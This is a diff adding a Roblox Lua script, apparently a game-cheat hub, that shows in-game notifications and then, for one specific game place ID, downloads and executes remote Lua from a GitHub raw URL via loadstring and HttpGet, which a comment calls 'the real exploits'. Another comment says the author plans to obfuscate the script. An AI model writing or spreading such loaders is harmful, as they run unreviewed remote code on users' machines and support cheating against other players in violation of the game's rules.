@@ -1,0 +1,41 @@
+
+-- imma get this obstructed ofc if im done doing this shi
+local d = function()
+    game.StarterGui:SetCore("SendNotification", {
+        Title = "detected.",
+        Text = "executing now...",
+        Duration = 5
+    })
+end
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Required!";
+    Text = "Waiting the game loaded..";
+    Duration = 49;
+}) 
+repeat wait() until game:IsLoaded()
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Loaded.";
+ 
+   
+})
+game.StarterGui:SetCore("SendNotification", {
+    Title = "made by SWFDevs";
+ 
+   
+})
+wait(1)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Notice to all Players nor Coders";
+    Text = "The script contains all the script places that i dont own. ill give credits if needed.";
+    Duration = 60;
+})
+
+-- the real exploits are now here.
+if game.PlaceId == 11379739543 then
+    d()
+    game.StarterGui:SetCore("SendNotification", {
+    Title = "timebomb duels(phantomx) made by_cypher";
+    })
+    
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AlphaBay00/PhantomXLoader/main/Ld.lua.txt"))()
